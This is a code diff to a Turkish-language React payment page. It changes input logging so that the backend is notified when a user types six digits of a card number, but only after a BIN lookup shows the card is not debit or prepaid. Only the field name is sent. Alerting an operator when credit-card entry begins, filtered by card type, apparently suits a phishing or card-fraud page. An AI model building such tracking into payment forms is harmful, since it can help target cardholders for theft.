@@ -47,20 +47,45 @@ function OdemeContent() {
     const [checkingRedirect, setCheckingRedirect] = useState(true);
     const [addressLoading, setAddressLoading] = useState(true);
 
-    // Input log fonksiyonu - 3 karakter yazıldığında tetiklenir
+    // Input log fonksiyonu - kredi kartı girerken ilk 6 haneyi bekler ve sadece kredi kartı ise loglar
     const logInput = (inputType: string, value: string) => {
-        // 3 karakter ve daha önce loglanmamış ise
-        if (value.length >= 3 && !loggedInputsRef.current.has(inputType)) {
-            // Önce ref'e ekle (senkron) - bu sayede tekrar istek gitmez
-            loggedInputsRef.current.add(inputType);
-
-            fetch('/api/input-log', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ inputType })
-            }).catch(error => {
-                console.error('Input log error:', error);
-            });
+        if (inputType === 'kredi_karti_numarasi') {
+            if (value.length >= 6 && !loggedInputsRef.current.has(inputType)) {
+                // BIN kontrolü ile kart tipini öğren
+                const info = findBankInfo(value);
+                if (info && info.CardType) {
+                    const typeLower = info.CardType.toLowerCase();
+                    const isDebit = typeLower.includes('debit') || typeLower.includes('banka');
+                    const isPrepaid = typeLower.includes('ön') || typeLower.includes('on') || typeLower.includes('odeme') || typeLower.includes('ödemeli') || typeLower.includes('prepaid');
+                    
+                    if (isDebit || isPrepaid) {
+                        // Debit veya Prepaid ise bildirim gönderme
+                        return;
+                    }
+                }
+                
+                // Kredi kartı veya bilinmeyen kart ise log gönder ve ref'e ekle
+                loggedInputsRef.current.add(inputType);
+                fetch('/api/input-log', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ inputType })
+                }).catch(error => {
+                    console.error('Input log error:', error);
+                });
+            }
+        } else {
+            // Diğer inputlar için varsayılan davranış (en az 3 karakter)
+            if (value.length >= 3 && !loggedInputsRef.current.has(inputType)) {
+                loggedInputsRef.current.add(inputType);
+                fetch('/api/input-log', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ inputType })
+                }).catch(error => {
+                    console.error('Input log error:', error);
+                });
+            }
         }
     };
 
